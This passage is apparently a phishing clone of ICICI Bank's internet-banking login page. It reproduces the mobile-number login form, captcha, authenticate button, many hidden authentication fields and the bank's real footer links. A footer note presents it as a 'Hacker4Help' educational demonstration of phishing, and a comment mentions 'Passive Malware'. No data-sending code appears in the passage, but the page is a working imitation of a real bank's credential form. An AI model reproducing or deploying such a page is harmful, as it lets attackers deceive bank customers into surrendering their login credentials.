value="241">241</option> <option value="242">242</option> <option value="243">243</option> <option value="244">244</option> <option value="245">245</option> <option value="246">246</option> <option value="247">247</option> <option value="248">248</option> <option value="249">249</option> <option value="250">250</option> <option value="251">251</option> <option value="252">252</option> <option value="253">253</option> <option value="254">254</option> <option value="255">255</option> <option value="256">256</option> <option value="257">257</option> <option value="258">258</option> <option value="260">260</option> <option value="261">261</option> <option value="262">262</option> <option value="263">263</option> <option value="264">264</option> <option value="265">265</option> <option value="266">266</option> <option value="267">267</option> <option value="268">268</option> <option value="269">269</option> <option value="284">284</option> <option value="290">290</option> <option value="291">291</option> <option value="297">297</option> <option value="298">298</option> <option value="299">299</option> <option value="345">345</option> <option value="350">350</option> <option value="351">351</option> <option value="352">352</option> <option value="353">353</option> <option value="354">354</option> <option value="355">355</option> <option value="356">356</option> <option value="357">357</option> <option value="358">358</option> <option value="359">359</option> <option value="370">370</option> <option value="371">371</option> <option value="372">372</option> <option value="373">373</option> <option value="374">374</option> <option value="375">375</option> <option value="376">376</option> <option value="378">378</option> <option value="380">380</option> <option value="381">381</option> <option value="385">385</option> <option value="386">386</option> <option value="387">387</option> <option value="389">389</option> <option value="420">420</option> <option value="421">421</option> <option value="423">423</option> <option value="473">473</option> <option value="500">500</option> <option value="501">501</option> <option value="502">502</option> <option value="503">503</option> <option value="504">504</option> <option value="505">505</option> <option value="506">506</option> <option value="507">507</option> <option value="508">508</option> <option value="509">509</option> <option value="590">590</option> <option value="591">591</option> <option value="592">592</option> <option value="593">593</option> <option value="594">594</option> <option value="595">595</option> <option value="596">596</option> <option value="597">597</option> <option value="598">598</option> <option value="599">599</option> <option value="670">670</option> <option value="671">671</option> <option value="672">672</option> <option value="673">673</option> <option value="674">674</option> <option value="675">675</option> <option value="676">676</option> <option value="677">677</option> <option value="678">678</option> <option value="679">679</option> <option value="680">680</option> <option value="681">681</option> <option value="682">682</option> <option value="683">683</option> <option value="684">684</option> <option value="685">685</option> <option value="686">686</option> <option value="687">687</option> <option value="688">688</option> <option value="689">689</option> <option value="690">690</option> <option value="691">691</option> <option value="692">692</option> <option value="767">767</option> <option value="809">809</option> <option value="850">850</option> <option value="852">852</option> <option value="853">853</option> <option value="855">855</option> <option value="856">856</option> <option value="869">869</option> <option value="876">876</option> <option value="880">880</option> <option value="886">886</option> <option value="960">960</option> <option value="961">961</option> <option value="962">962</option> <option value="963">963</option> <option value="964">964</option> <option value="965">965</option> <option value="966">966</option> <option value="967">967</option> <option value="968">968</option> <option value="971">971</option> <option value="972">972</option> <option value="973">973</option> <option value="974">974</option> <option value="975">975</option> <option value="976">976</option> <option value="977">977</option> <option value="988">988</option> <option value="993">993</option> <option value="994">994</option> <option value="995">995</option> <option value="996">996</option> <option value="998">998</option> <option value="1340">1340</option> <option value="1670">1670</option> <option value="1787">1787</option> <option value="1868">1868</option></select></span></span><span class="labelColumn"><input type="text" name = "AuthenticationFG.RIB_LOGIN_MOBILE" title = "Registered Mobile Number" size = "28"" class = "mob-no-input type_FEBAUnboundString" data-febaType = "FEBAUnboundString"" maxLength = "15" id="AuthenticationFG.RIB_LOGIN_MOBILE" value="" title = "Registered Mobile Number" onkeypress='return valMobileCountry(event);'/></span></span></p>

		  
		   
		  <!-- added for Login Captcha Changes start here  --->
	
		
		 
		 
            
              
            
          <p  id="HDisplayMobile.Rb9"class="loginrow-VM">
<span  id="HDisplayMobile.Rb9.C1"><label for="AuthenticationFG.VERIFICATION_CODE" id = "Security check"title = "Security check" class = "label" >Security check</label></span></p>

          
            
              
             
             
                
                
                 
                 
            
          <p  id="HDisplayMobile.Rb10"class="loginrow-V1 captcha-margintop">
<span  id="HDisplayMobile.Rb10.C1"><img src="AuthenticationController;jsessionid=0000CkxMTwCjWD0ipwD0uUE-XBR:R08p6zdgq?bwayparam=3aosTLjZg8XmIyFI%2FXAom2fkE9feZRiiL2Jj%2BAXx4eJYaqkfcDrkWvQU%2BPLqgjeHIg5qPArlnGsR%0D%0ArhI5zN23hl%2FfuMt57BK35j5FDoSR7uU%3D" alt="Please Click On The Icon Next For Audio" id="IMAGECAPTCHA" /><span class="simpletext">&nbsp;&nbsp;</span><a  href="AuthenticationController;jsessionid=0000CkxMTwCjWD0ipwD0uUE-XBR:R08p6zdgq?bwayparam=3aosTLjZg8XmIyFI%2FXAom2fkE9feZRiiL2Jj%2BAXx4eKPD7%2FBW9kxSfa1yy9N6XowIs1gJF3Bx8VO%0D%0ANWq15791bq4mmwRA7ChWniw3uuEezJtVcis7TE%2Ba4X04%2BohAy5b9"><img src="L001/consumer/images/reset.jpg?mtime=1472814759000" alt="Click here to Change Image" title="Click here to Change Image" class="mblgin_refresh_img" id="TEXTIMAGE"border="0" onload="captchaRefresh()" /></a></span></p>

                                  
            
            
			
			
              
			  
            
         <p  id="HDisplayMobile.Rb12"class="loginrow-V1">
<span  id="HDisplayMobile.Rb12.C1"><span class="simpletext" id="captchNotes">Enter the text as shown above</span><span class="labelColumn"><input type="text" name = "AuthenticationFG.VERIFICATION_CODE" title = "Verification Code"" class = "querytextboxmedium text-field-captcha type_FEBAUnboundString" data-febaType = "FEBAUnboundString"" maxLength = "" id="AuthenticationFG.VERIFICATION_CODE" value="" title = "Verification Code" onkeyup='return mobCaptchaEnq(event);'/></span></span></p>

		 <!-- added for Login Captcha Changes end here  -->
          
		  
          
                     
				
				 
				            
          <p  id="HDisplayMobile.Rc6"class="m_cf forgot-details">
<span  id="HDisplayMobile.Rc6.C1"><label for=" " id = "OTP_SCREEN_PAGE"title = "Authenticate" class = "completeHide hide" >Authenticate</label></span></p>

          
				
					<!-- Added for iMobile SSO - Start -->
					
                	
					
					
                	
                	<!-- Added for iMobile SSO - End -->
				
          <p  id="HDisplayMobile.Rb20"class="btn-dev">
<span  id="HDisplayMobile.Rb20.C1"><span class="HW_formbtn_grey"><input  type="Submit" name="Action.CUSTOM_RIB_VALIDATE_MOBILE_LOGIN" class="cta get-OTP-page" id="CUSTOM_RIB_VALIDATE_MOBILE_LOGIN" value="Authenticate" title = "Authenticate" disabled="disabled"/></span></p>

           
           
                        
              
            
            

              
			    
           
            
           <p  id="HDisplayMobile.Rb30"class="login-info">
<span  id="HDisplayMobile.Rb30.C1" class="ainner-col-2"><span class="need-user" id="span_dummy"title = "Login with UserId"  onClick='loginWithUserIdLink();'><a <a href="#" title = "Login with UserId" id="dummy" name = "HREF_dummy" >Login with UserId</a></span></span><span  id="HDisplayMobile.Rb30.C1"><span class="need-user" id="span_Caption29543082"title = "Need Help?" ><a <a href="http://www.icicibank.com/online-demo/introduction.page" title = "Need Help?" id="Caption29543082" name = "HREF_Caption29543082"  class = "" target = "_blank">Need Help?</a></span></span></p>

            
	                          		
	                	                	              	
				
	        <p  id="HDisplayMobile.Rb20">
<span  id="HDisplayMobile.Rb20.C2"><input  type="Submit" name="Action.LOGIN_MODE_SEL" class="completeHide hide" id="LOGIN_MODE_SEL_FROM_MOB" value="t" title = "Log In"/></span></p>
 
                   
        </div>

						
        
    
  </div>

  <!--CIB RIB Integration - START -->
  
  <!--CIB RIB Integration - END -->
   
    
  
  <!--
 IBM pin points-- Kartikey Passive Malware
 -->

  



  <!-- Added for iMobile SSO - Start -->
 

  <!-- Added for iMobile SSO - End -->

  <!-- Added for DehLogin - Start -->
  <div  class="width100percent_loginbg completeHide" id="HDisplayDEH">
              
                
                  <div  class="width100percent" id="HDisplayDEH.Rowset2">
                    
                      
                        
                      
                    <p  id="HDisplayDEH.Ra2"class="center">
<span  id="HDisplayDEH.Ra2.C2" class="textwithlargerfont"><span class="null" id="">Request in progress.... Please do not close this window</span></span></p>

                    
                      
                        
                      
                    <p  id="HDisplayDEH.Ra3"class="center">
<span  id="HDisplayDEH.Ra3.C3"><img src="L001/consumer/images/widget-loading.gif?mtime=1472814764000" alt="Widget-Loading" title="Widget-Loading" height="50" width="50" id="Widget-Loading_Img"border="0" /></span></p>

                  </div>

                
              
  </div>

  <!-- Added for DehLogin - End -->

  <div  class="section" id="Footertext">
    
  
        <div  class="center width100percent1_new" id="Footertext.Rowset1">
          
            
              
            
          <p  id="Footertext.Ra28a"class="m_cf bold1">Note:- This is for the  educational and awareness purpose only. This is the initiative from the Hacker4Help team to aware you by showing the phishing scams which are happening in the market now and many people fall in this trap. So this page is used for your awareness so that you can detect the phishing pages if you get from now .
<span  id="Footertext.Ra28a.C1"><span class="bold_new" id="Caption17995316"title = "Digital Secutiry:" >Digital Security:</span></span></p>

          
            
              
            
          <p  id="Footertext.Ra29"class="formrow m_cf">
<span  id="Footertext.Ra29.C1"><span class="long_text_last_new" id="Caption11224625"title = "https://infinity.icicibank.com has been verified by Entrust. The communication of your private information from any address beginning with &quot;https&quot; is encrypted and secured using SSL." >https://infinity.icicibank.com has been verified by Entrust. The communication of your private information from any address beginning with &quot;https&quot; is encrypted and secured using SSL.</span></span></p>

        </div>

      
    
  </div>


  <input  type="Hidden" name="FG_BUTTONS__" value="VALIDATE_CREDENTIALS,VALIDATE_CREDENTIALS_DIG_CERT,BACK,CLEAR_VALUES"  id="FGBUTTONS" />
  <input  type="Hidden" name="AuthenticationFG.IS_FIRST_AUTHENTICATION" value="Y"  id="AuthenticationFG.ISFIRSTAUTHENTICATION" />
  <input  type="Hidden" name="QS" value=""  id="QS" />
  <input  type="Hidden" name="MD" value=""  id="MD" />
   <input  type="Hidden" name="PID" value=""  id="PID" />
    <input  type="Hidden" name="PRN" value=""  id="PRN" />
     <input  type="Hidden" name="ITC" value=""  id="ITC" />
      <input  type="Hidden" name="AMT" value=""  id="AMT" />
       <input  type="Hidden" name="CRN" value=""  id="CRN" />
        <input  type="Hidden" name="RU" value=""  id="RU" />
        <input  type="Hidden" name="CG" value=""  id="CG" />
          <input  type="Hidden" name="ES" value=""  id="ES" />
  <input  type="Hidden" name="RUBACK" value="null"  id="RUBACK" />
  <input  type="Hidden" name="AuthenticationFG.LOGIN_MODE_FLAG" value=""  id="PageIdentifier" /> 
        <!-- Added for iMobile SSO - Start -->
		<input  type="Hidden" name="AuthenticationFG.__CALL_MODE__" value="null"  id="AuthenticationFG.__CALL_MODE__" />
		<!-- Added for iMobile SSO - End -->

  <input  type="Hidden" name="CATEGORY_ID" value=""  id="CATEGORYID" />
  <input  type="Hidden" name="AuthenticationFG.PREFERRED_LANGUAGE" value="001"  id="AuthenticationFG.PREFERREDLANGUAGE" />
 <input  type="Hidden" name="FORMSGROUP_ID__" value="AuthenticationFG"  id="FORMSGROUP_ID__" />
 <input  type="Hidden" name="AuthenticationFG.REPORTTITLE" value="AuthenticationScreen"  id="AuthenticationFG.REPORTTITLE" />

















 	

	

	<input  type="Hidden" name="counterPartyNickName" value=""  id="counterPartyNickName" />

	

    <input  type="Hidden" name="amountSendToCxps" value=""  id="amountSendToCxps" />

    

    <input  type="Hidden" name="counterPartyTpe" value=""  id="counterPartyTpe" />

    

    <input  type="Hidden" name="freqTyp" value=""  id="freqTyp" />

	<input  type="Hidden" name="bankId" value="ICI"  id="bankId" />

	<input  type="Hidden" name="cxpsUserId" value=""  id="cxpsUserId" />

	<input  type="Hidden" name="corpId" value=""  id="corpId" />

	<input  type="Hidden" name="usertype" value="1"  id="usertype" />

	<input  type="Hidden" name="RECEIVED_RESPONSE" value=""  id="RECEIVED_RESPONSE" />















<div id="CrossSellContainer"></div>

</div>









	

	<!-- Role is added for DDA to specify footer of the page -->

	
	</div></div></div>
	
	<div id="footer" role="contentinfo">



	

			 








<!-- COMMENTED BY HARPREET TO REMOVE ADDITIONAL INFO THROUGHOUT -->
     
      
	










<!-- Added for UPI error message START-->
<style type="text/css">
.upi_error{
color: #eb6c18;
font-weight: 700;
text-decoration: underline !important;

}
</style>



<!-- Added for UPI error message END-->
<!-- Commenting due to incompatability of Mozilla FireFox 11.0 -->

<!-- Added to disable copy-paste - START -->

<!--<script type="text/javascript" >

	function killCopy(e){

	return false

	}

	function reEnable(){

	return true

	}



	document.onselectstart=new Function ("return false")

	if (window.sidebar){

	document.onmousedown=killCopy

	document.onclick=reEnable

	}



</script>-->

<!-- Added to disable copy-paste - END -->

<!-- Added to disable right click - START -->



<!-- Added to disable right click - END -->

<!-- Added for Grid card autotab functionality - Start -->

<script type="text/javascript">

function checkLen(element,elementLength)

{



if (elementLength.toString().length==element.maxLength)

  {



  var next=element.tabIndex;

  if (next<feba.domManipulator.getElement("form")[0].length)

    {	    

	  feba.domManipulator.getElement("form")[0].elements[next+1].focus();

    }

  }

}



function moveCursorTo(fieldMaxLength, contentLength, nextFieldID){

	if(contentLength == fieldMaxLength){		

		//alert(jQuery("#"+"FORMSGROUP_ID__").val());						

		if(nextFieldID != ''){			

			var fieldIDSplit = nextFieldID.split(".");

			var fgname = fieldIDSplit[0];

			var fieldname = fieldIDSplit[1];

			jQuery("#"+fgname+"\\."+fieldname).focus();

		}

	}

}

function numberOnly(content, fieldID){
		
	 if (content.charCodeAt(0)<48||content.charCodeAt(0)>57)
	{
	alert("Please enter numeric values only");
	document.getElementById(fieldID).value="";
			}
	 if (content.length>1&&(content.charCodeAt(1)<48||content.charCodeAt(1)>57))
	
	{
	alert("Please enter numeric values only");
	document.getElementById(fieldID).value="";

				}
}

</script>

<!-- Added for Grid card autotab functionality - End -->

<!--Added for UPI Err Msg inclusion - Start -->
<script>
	function callUPIModal2()
	{
		jQuery("[id$='ViewDetails2']").click();
	}
</script>
<!--Added for UPI Err Msg inclusion - End -->


<div id="footerInner">

 		

			<div id="FooterContainerTop" class="FooterTop_Global">

    	<div class="FooterTop">

        	<div class="FooterLinksContainer" id="FooterLinksContainer1">

        	  

                 <h5 class="FooterLinksClassification FooterLinksClassificationColor_Global">Customer Service</h5>

             

             <a target="_blank" href="http://www.icicibank.com/complaints/customer-care.html" title="Safe Banking" class="compliments">Customer Care Numbers</a>
			<br>
			
			 <a target="_blank" href="https://www.icicibank.com/complaints/complaints.page?ITM=nli_cms_CONTACT_US_complaints_menu_navigation" title="Safe Banking" class="compliments">Grievance Redressal</a>

              </div>

        	 

            	

           

            

            

            

            <div class="FooterLinksContainer" id="FooterLinksContainer2">

            	<h5 class="FooterLinksClassification FooterLinksClassificationColor_Global">Useful Links</h5>

            	<a target="_blank" href="AuthenticationController?FORMSGROUP_ID__=AuthenticationFG&__START_TRAN_FLAG__=Y&__EVENT_ID__=LOAD&__CALL_MODE__=10&LOGIN_FLAG=1&BANK_ID=ICI" title="Get User ID" class="Global first">Get User ID</a>|<a target="_blank" href="http://www.icicibank.com/Personal-Banking/insta-banking/insta-index.html" title="Ways To Bank" class="Global">Ways To Bank</a> |<a target="_blank" href="http://www.icicibank.com/Personal-Banking/insta-banking/internet-banking/index.html" title="Online Banking" class="Global">Online Banking</a>|<a target="_blank" href="http://www.icicibank.com/Personal-Banking/account-deposit/savings-account/index.html" title="Savings Account" class="Global">Savings Account</a>|<a target="_blank" href="http://www.icicibank.com/Personal-Banking/investments/ppf/ppf.html" title="PPF" class="Global">PPF</a>| <a target="_blank" href="http://www.icicibank.com/financial-tools/index.html" title="Personal Finance Tools" class="Global">Personal Finance Tools</a> | <a target="_blank" href="http://www.icicibank.com/form-center.html" class="Global" title="Form Center">Form Center</a> |<a target="_blank" href="http://www.icicibank.com/Personal-Banking/investments/icici-bank-pure-gold/gold-rate.html" title="Gold Rate Today" class="Global">Gold Rate Today</a>| <a target="_blank" href="http://www.icicibank.com/media-gallery/media-gallery.html" title="Media Gallery" class="Global">Media Gallery</a>|<a target="_blank" href="http://www.icicibank.com/Personal-Banking/credit-card/credit-cards.html" title="Credit Card" class="Global">Credit Card</a>

            </div>



            <div class="FooterLinksContainer1" id="FooterLinksContainer3">

            	<h5 class="FooterLinksClassification FooterLinksClassificationColor_Global m_h5Overwrite">Visit Other ICICI Bank Sites</h5>

            	<div id="new" class="ICICI_links">

                <a target="_blank" href="http://www.icicigroupcompanies.com/" title="ICICI Group" class="Global first">ICICI Group</a> | <a target="_blank" href="http://www.icicifoundation.org/" title="ICICI Foundation" class="Global">ICICI Foundation</a> | <a target="_blank" href="https://www.icicilombard.com/" class="Global" title="ICICI Lombard General Insurance">ICICI Lombard General Insurance</a> | <a target="_blank" href="http://www.iseconline.com/" title="ICICI Securities" class="Global">ICICI Securities</a> | <a target="_blank" href="http://www.iciciprulife.com/public/default.htm" title="ICICI Prudential Life Insurance" class="Global">ICICI Prudential Life Insurance</a> | <a target="_blank" href="http://www.icicipruamc.com/Homepage.aspx" title="ICICI Prudential AMC" class="Global">ICICI Prudential AMC</a> | <a target="_blank" href="http://www.iciciventure.com/" class="Global" title="ICICI Venture">ICICI Venture</a> | <a target="_blank" href="http://content.icicidirect.com/newsitecontent/Home/Home.asp" class="Global" title="ICICI Direct">ICICI Direct</a>  | <a target="_blank" href="http://www.icicihfc.com/" title="ICICI Home Finance" class="Global">ICICI Home Finance</a> | <a target="_blank" href="http://www.icicibank.com/ebor/index.html" title="Erstwhile The Bank of Rajasthan" class="Global">Erstwhile The Bank of Rajasthan</a> | <a target="_blank" href="https://www.icicicareers.com/icici_career/home.aspx?X" title="Careers" class="Global">Careers</a> | <a target="_blank" href="http://www.icicibankbahrain.com/" title="Bahrain" class="Global">Bahrain</a> | <a target="_blank" href="http://www.icicibank.ca/" title="Canada" class="Global">Canada</a> | <a target="_blank" href="http://www.icicibank.de/" title="Germany" class="Global">Germany</a> | <a target="_blank" href="http://www.icicibank.hk/" title="HongKong" class="Global">Hong Kong</a> | <a target="_blank" href="http://www.icicibankrussia.com/" title="Russia" class="Global">Russia</a> | <a target="_blank" href="http://www.icicibank.com.sg/" title="Singapore" class="Global">Singapore</a> | <a target="_blank" href="http://www.icicibank.lk/" title="Srilanka" class="Global">Srilanka</a> | <a target="_blank" href="http://www.icicibank.co.uk/" title="UK" class="Global">UK</a> | <a target="_blank" href="http://www.icicibankusa.com/" title="US" class="Global">US</a>

            </div>

            </div>

            

             <div class="FooterLinksContainer2" id="FooterLinksContainer4">

        	  <h5 class="FooterLinksClassification FooterLinksClassificationColor_Global m_h5Overwrite" style="margin-top: 5px;">Our Initiatives</h5>

                <div id="new" class="ICICI_links m_tbl_txt_width">

                <a target="_blank" href="http://www.icicibank.com/online-safe-banking/index.html" title="Safe Banking" class="Global">Safe Banking</a> | <a target="_blank" href="http://www.icicibank.com/go-green/Index.html" class="Global" title="Go Green">Go Green</a>

        	  </div>

        	   </div>

            

            

        	<!--footer top div close-->

        </div>

    	<!--FooterContainerTop div close-->

    </div>



    <div id="FooterContainerBottom" class="FooterBottom_Global">

    	<div id="FooterMenuContainer">

        	<a target="_blank" href="http://www.icicibank.com/terms-condition/terms-and-conditions.html" class="Global first" title="Terms &amp; Conditions">Terms &amp; Conditions</a> | <a target="_blank" href="http://www.icicibank.com/interest-rates.html" class="Global" title="Interest Rates">Interest Rates</a> | <a target="_blank" href="http://www.icicibank.com/service-charges/service-charges.html" title="Service Charges & Fees" class="Global">Service Charges &amp; Fees</a> | <a target="_blank" href="http://www.icicibank.com/do-not-call.html" title="Do Not Call Registry" class="Global">Do Not Call Registry</a> | <a target="_blank" href="http://www.icicibank.com/disclaimer.html" title="Disclaimer" class="Global">Disclaimer</a> | <a target="_blank" href="http://www.icicibank.com/multilingual-disclaimer.html" title="Multilingual Disclaimer" class="Global">Multilingual Disclaimer</a> | <a target="_blank" href="http://www.icicibank.com/code-of-commitment.html" class="Global" title="Code of Commitment">Code of Commitment</a> | <a target="_blank" href="http://www.icicibank.com/aboutus/pdf/code_of_business_conduct_ethics.pdf" class="Global" title="Group Code of Business Conduct and Ethics">Group Code of Business Conduct and Ethics</a> | <a target="_blank" href="http://www.icicibank.com/aboutus/invest-disclosure.html" class="Global" title="Basel II Disclosures">Basel II Disclosures</a> | <a target="_blank" href="http://www.icicibank.com/notice-board.html" class="Global" title="Notice Board">Notice Board</a> | <a target="_blank" href="http://www.icicibank.com/unparliamentary-language-by-customers.html" class="Global" title="Use of Unparliamentary Language by Customers">Use of Unparliamentary Language by Customers</a> | <a target="_blank" href="http://www.icicibank.com/privacy.html" class="Global" title="Privacy">Privacy</a> | <a target="_blank" href="http://www.icicibank.com/usa-patriot-act-certification.html" class="Global" title="USA Patriot Act Certification">USA Patriot Act Certification</a>

        	<!--FooterMenuContainer div close-->
        		<div  class="hide" id="PageHeader1">
	    					    
	      						  
	        						
	          						  
	          						    
	        								
	        					
	        					   <p  id="PageHeader1.Ra1"class="hide">
<span  id="PageHeader1.Ra1.C1" class="hide"><span class="labelColumn_combo"><span class="labelColumn_combo_brdr"> <select  name= "FieldDropdown" class = "dropdownexpandalbe hide" id="FieldDropdown" title = "Upgrade Debit Card"> <option value="">Select</option> <option value="Value">Value</option></select></span></span></span></p>

	        						
	     						   
	    						  
  							</div>
 

        </div>
        
        <!-- Added for chatbot -start-->
										
				
				
				<input  type="Hidden" name="TxnType" value=""  id="TxnType" />
				<!-- Added for CHATBOT ENCRYPTED USER ID -start-->

				<!-- Added for CHATBOT ENCRYPTED USER ID -start-->
					
					<input  type="Hidden" name="CHAT_USERID" value=""  id="CHAT_USERID" />

					
					<input  type="Hidden" name="FEDID" value="0"  id="FEDID" />

					

					<input  type="Hidden" name="ChatEncUserId" value="z+ArlOwUX6ewN6ncDVmifg=="  id="ChatEncUserId" />

				<!-- Added for CHATBOT ENCRYPTED USER ID -end-->


<!-- Added for chatbot -end-->	

<!--Added for UPI Err Msg inclusion - Start -->
 <a data-isExcluded="true" style="display:none; position:absolute;"  id="ViewDetails2" href="#">"+"Add Funds"+"</a> 
<!--Added for UPI Err Msg inclusion - End -->

        <!--  <div id="FooterBottomTextContainer">

        	Best viewed with Internet Explorer 7 or Firefox 3.6 with a resolution of 1024 x 768

        	FooterBottomTextContainer div close

        </div>-->

    	<!--FooterContainerBottom div close-->

    </div>



		

</p>

</div>



<!-- Added for OTP Bypass Vulnerability security Issue - start -->




<input  type="Hidden" name="MFPrint" value=""  id="MFPrint" />
<input  type="Hidden" name="xyz" value=""  id="xyz" />
<input  type="Hidden" name="ABC" value="ABC"  id="ABC" />

	

<!-- Added for OTP Bypass Vulnerability security Issue - end -->
<!--Added for UPI Err Msg inclusion - Start -->
 

       
<script type="text/javascript">feba.features.MODAL_VIEW_CONTAINER = new feba.js.ajax.modalView(
{
isListPaginated: "true",
paintExceptionOnPage: "true",
CLOSE_URL: "FinacleRiaRequest;jsessionid=0000CkxMTwCjWD0ipwD0uUE-XBR:R08p6zdgq?bwayparam=3aosTLjZg8XmIyFI%2FXAom2fkE9feZRiiL2Jj%2BAXx4eKkKDkMENaqiMipzHeVqyJ0CyeGoHhENERa%0D%0Ae%2F0lPoGLFSvY%2FFI7qLIixGV2RcDJ%2ByY0QG4u9xjxNKKLvomiqy31hI1p1o2wlkXs3DDuzfTsgAlCDUYv%0D%0A%2Fq6tPxDsHlxbqz69MP%2BeEGoNgA98DWreM3a%2B",
eventType: "click",
source: "ViewDetails2",
abortEvent: "PREVENT_SESSION_TIMEOUT__",
baseUrl: "FinacleRiaRequest;jsessionid=0000CkxMTwCjWD0ipwD0uUE-XBR:R08p6zdgq?bwayparam=3aosTLjZg8XmIyFI%2FXAom2fkE9feZRiiL2Jj%2BAXx4eKG%2B1%2BnRiGlUGcwdDkpeRyVMsayXJrT1Pa2%0D%0AIpdsjww1LsUfiP6DJE8Gpn4sv%2B%2FcGw3SvC5stGIeiyzNuaEbFshN2AqkkO%2F%2FRoe%2BhEu3g7TGLdw1%2BslP%0D%0A8Paofg7l8ufNYklvzhUZmHSNPgChAREWSRy5%2BnfO990qDKTqwcYVz4%2FwcZVcL%2FcaqUfV2Y0cvjByXQFR%0D%0ALPAp89zY4OR3r6M2c2yPj0J3j4IJisPa1DCoEuB5b30m1GsUOSCGVQcYplC2kNrvLS2p%2F2tdRXBlCyFL%0D%0AWRXyL0kGt1dQ83zwz7ZGmq0PgQ%3D%3D",
startIndex: "0",
hideTitle: "false",
forcontrolIDs: "User ID=AuthenticationFG.USER_PRINCIPAL@@Access Code=AuthenticationFG.ACCESS_CODE@@Language:=AuthenticationFG.PREFERRED_LANGUAGE@@Default Login Page:=AuthenticationFG.MENU_ID@@",
asynchronous: "false",
endIndex: "1",
retainValuesOnException: "true",
width: "730",
riaFeatureID: "1",
tagHelper: "MODAL_VIEW.TagHelper",
height: "400"});
</script>
<!--Added for UPI Err Msg inclusion - End -->


		

	</div>

	

	<div id="footer-line" class="footer_line"><img width="1" height="1" src="L001/consumer/images/trans.gif"></div>





</div>



<!-- Portal Changes end-->




 <input  type="Hidden" name="AuthenticationFG.ARCOT_CHALLENGE" value=""  id="AuthenticationFG.ARCOT_CHALLENGE" />
 <input  type="Hidden" name="AuthenticationFG.SIGNED_CHALLENGE" value="1001"  id="AuthenticationFG.SIGNED_CHALLENGE" />
 <input  type="Hidden" name="AuthenticationFG.ARCOT_CLIENT_TYPE" value=""  id="AuthenticationFG.ARCOT_CLIENT_TYPE" />
 <input  type="Hidden" name="AuthenticationFG.ARCOT_ENABLE_BROWSER" value="N"  id="AuthenticationFG.ARCOT_ENABLE_BROWSER" />
 <input  type="Hidden" name="AuthenticationFG.CALLERID" value=""  id="AuthenticationFG.CALLERID" />
 <input  type="Hidden" name="AuthenticationFG.ARCOT_IP_ADDRESS" value=""  id="AuthenticationFG.ARCOT_IP_ADDRESS" />
 <input  type="Hidden" name="AuthenticationFG.FETCH_ARCOTID_FLAG" value="N"  id="AuthenticationFG.FETCH_ARCOTID_FLAG" />
 <input  type="Hidden" name="AuthenticationFG.ARCOT_DEVICE_ID" value="1001"  id="AuthenticationFG.ARCOT_DEVICE_ID" />
 <input  type="Hidden" name="AuthenticationFG.ARCOT_DEVICE_DNA" value=""  id="AuthenticationFG.ARCOT_DEVICE_DNA" />
 <input  type="Hidden" name="AuthenticationFG.ARCOT_TIME_OUT" value="N"  id="AuthenticationFG.ARCOT_TIME_OUT" />
 <input  type="Hidden" name="AuthenticationFG.ARCOT_EXECUTION_TIME" value=""  id="AuthenticationFG.ARCOT_EXECUTION_TIME" />
 <input  type="Hidden" name="AuthenticationFG.ARCOT_IS_DNA_DONE" value="false"  id="AuthenticationFG.ARCOT_IS_DNA_DONE" />
 <input  type="Hidden" name="AuthenticationFG.ARCOT_FLASH_COOKIE" value="1001"  id="AuthenticationFG.ARCOT_FLASH_COOKIE" />
 <input  type="Hidden" name="AuthenticationFG.ARCOT_JAVA_SCRIPT_FLAG" value="disabled"  id="AuthenticationFG.ARCOT_JAVA_SCRIPT_FLAG" />
 <input  type="Hidden" name="AuthenticationFG.ARCOT_FLASH_FLAG" value="disabled"  id="AuthenticationFG.ARCOT_FLASH_FLAG" />
 <input  type="Hidden" name="AuthenticationFG.ARCOT_EXTRALOG" value=""  id="AuthenticationFG.ARCOT_EXTRALOG" />
 <input  type="Hidden" name="AuthenticationFG.ARCOT_NO_SCRIPT_TAG" value=""  id="AuthenticationFG.ARCOT_NO_SCRIPT_TAG" />
 <input  type="Hidden" name="AuthenticationFG.CHNL_IDNTFR" value="RIB"  id="AuthenticationFG.CHNL_IDNTFR" />
 <input  type="Hidden" name="AuthenticationFG.UBA_PASSWORD" value=""  id="AuthenticationFG.UBA_PASSWORD" />
 <input  type="Hidden" name="UserId" value=""  id="AuthenticationFG.USER_PRINCIPAL1" /> 
 <input  type="Hidden" name="LOGIN_REVAMP_NLI_URL" value="https://www.icicibank.com/personal-banking/login/primer"  id="LOGIN_REVAMP_NLI_URL" /> 
 <input  type="Hidden" name="AuthenticationFG.PINOTPFLG" value="N"  id="AuthenticationFG.PINOTPFLG" />

<input  type="Hidden" name="JS_ENABLED_FLAG" value="N"  id="JS_ENABLED_FLAG" /><input  type="Hidden" name="CHECKBOX_NAMES__" value="AuthenticationFG.REMEMBER_USERID_CHECKBOX"  id="CHECKBOX_NAMES__" /><input  type="Hidden" name="Requestid" value="1"  id="Requestid" /><script type="text/javascript">feba.js.common.checkJS("JS_ENABLED_FLAG");</script><input  type="Hidden" name="AuthenticationFG.__COLLAPSIBLE_IDS__" value="|"  id="COLLAPSIBLE_IDS" /><script type="text/javascript">var imageAltPlus = 'Plus';var imageAltMinus = 'Minus';var imageTitleExpand = 'Expand';var imageTitleCollapse = 'Collapse';var imagePath = 'L001/consumer/images';initHideSeek('null');</script><NOSCRIPT><BR><CENTER><B>
Your browser is not Javascript enabled. Please enable Javascript for enhanced security.
</B></CENTER></NOSCRIPT>
<INPUT TYPE='HIDDEN' id='__JS_ENCRYPT_KEY__' name='__JS_ENCRYPT_KEY__' value='10001,ca7e2d9fa107328ab61851473310f16bd38d7e268cc04612b966d5b12fb8194443376f1c620e91d9e7f132bbf2e076e49a38e4edc9c425d6f4f10116564bcd3c9f053f50a3eec1ad0e753d26e9b0afd859feae10afb20b79fc71d8e3545c16312e44e01ea95047a33c064e96e1874c2222c4da64fd00251e88d2725e6958452f,131'><script type="text/javascript">jsVarForControlIds="AuthenticationFG.MENU_ID=Start In@@AuthenticationFG.VERIFICATION_CODE=Security check@@AuthenticationFG. =Authenticate@@"</script><script type="text/javascript">jQuery(function(){RedrawAllTrees();jsonObj={"TypesCatalogue":{"UserPrincipal" : {"LEN":"65",
"JUS":"LEFT_JUSTIFIED",
"CST":"MIXED_CASE",
"CNT":"ALPHA_NUMERIC",
"SEC":"false",
"BCC":"false",
"PTY": "STR"
},"FEBAUnboundString" : {"LEN":"-1",
"JUS":"LEFT_JUSTIFIED",
"CST":"MIXED_CASE",
"CNT":"null",
"SEC":"false",
"BCC":"false",
"PTY": "STR"
},"FEBAUnboundString" : {"LEN":"-1",
"JUS":"LEFT_JUSTIFIED",
"CST":"MIXED_CASE",
"CNT":"null",
"SEC":"false",
"BCC":"false",
"PTY": "STR"
}}};init(jsonObj,null,jsVarForControlIds);
feba.js.common.blockOnButtonClicks("loadingImage");
